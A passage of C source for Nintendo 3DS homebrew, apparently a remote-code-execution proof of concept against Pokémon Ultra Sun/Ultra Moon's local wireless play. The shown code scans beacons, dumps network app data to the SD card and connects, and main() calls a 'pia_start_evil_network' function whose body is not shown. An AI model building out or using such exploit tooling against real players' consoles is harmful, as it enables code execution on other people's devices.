	//With normal client-side handling you'd keep running network-scanning until the user chooses to stops scanning or selects a network to connect to. This example just scans a maximum of 10 times until at least one network is found.
	while (!total_networks)
	{
		total_networks = 0;
		memset(tmpbuf, 0, sizeof(tmpbuf_size));
		ret = udsScanBeacons(tmpbuf, tmpbuf_size, &networks, &total_networks, wlancommID, 0xff, NULL, false);
		printf("udsScanBeacons() returned 0x%08x.\ntotal_networks=%u.\n", (unsigned int)ret, (unsigned int)total_networks);

		if(total_networks)break;
	}

	free(tmpbuf);
	tmpbuf = NULL;

	if(total_networks)
	{
		printf("network count = %u.\n", total_networks);
		//At this point you'd let the user select which network to connect to and optionally display the first node's username(the host), along with the parsed appdata if you want. For this example this just uses the first detected network and then displays the username of each node.
		//If appdata isn't enough, you can do what DLP does loading the icon data etc: connect to the network as a spectator temporarily for receiving broadcasted data frames.

		network = &networks[0];

		printf("network: total nodes = %u.\n", (unsigned int)network->network.total_nodes);
		printf("network: max nodes = %u.\n", (unsigned int)network->network.max_nodes);
		printf("network: subId = 0x%02x\n", network->network.id8);

		for(pos=0; pos<UDS_MAXNODES; pos++)
		{
			if(!udsCheckNodeInfoInitialized(&network->nodes[pos]))continue;

			memset(tmpstr, 0, sizeof(tmpstr));

			ret = udsGetNodeInfoUsername(&network->nodes[pos], tmpstr);
			if(R_FAILED(ret))
			{
				printf("udsGetNodeInfoUsername() returned 0x%08x.\n", (unsigned int)ret);
				free(networks);
				return;
			}

			printf("node%u username: %s\n", (unsigned int)pos, tmpstr);
		}

		//You can load appdata from the scanned beacon data here if you want.
		actual_size = 0;
		ret = udsGetNetworkStructApplicationData(&network->network, out_appdata, sizeof(out_appdata), &actual_size);
		if(R_FAILED(ret))
		{
			printf("udsGetNetworkStructApplicationData() returned 0x%08x.\n", (unsigned int)ret);
			free(networks);
			return;
		}
		
		if (actual_size == sizeof(u32)) printf("network: appdata32 = 0x%x\n", *(u32*)&out_appdata[0]);
		
		FILE* f = fopen("sdmc:/app_data.bin", "wb");
		fwrite(out_appdata, actual_size, 1, f);
		fclose(f);
		ret = udsConnectNetwork(&network->network, passphrase, sizeof(passphrase), &bindctx, UDS_BROADCAST_NETWORKNODEID, conntype, data_channel, recv_buffer_size);
		if (R_FAILED(ret)) {
			printf("udsConnectNetwork() returned 0x%08x.\n", (unsigned int) ret);
			return;
		}
		
		printf("Connected.\n");
		udsDisconnectNetwork();
		udsUnbind(&bindctx);
	}
}

int main()
{
	Result ret=0;

	gfxInitDefault();
	consoleInit(GFX_TOP, NULL);

	printf("pokemon ultra sun/ultra moon RCE PoC\n");

	ret = udsInit(0x3000, "pialznerf");//The sharedmem size only needs to be slightly larger than the total recv_buffer_size for all binds, with page-alignment.
	if(R_FAILED(ret))
	{
		printf("udsInit failed: 0x%08x.\n", (unsigned int)ret);
	}
	else
	{
		//pia_get_app_data();
		pia_start_evil_network(); //pia_get_app_data();
		udsExit();
	}

	printf("Press START to exit.\n");

	// Main loop
	while (aptMainLoop())
	{
		gspWaitForVBlank();
		hidScanInput();

		u32 kDown = hidKeysDown();
		if (kDown & KEY_START)
			break; // break in order to return to hbmenu

		// Flush and swap framebuffers
		gfxFlushBuffers();
		gfxSwapBuffers();
	}

	gfxExit();
	return 0;
}
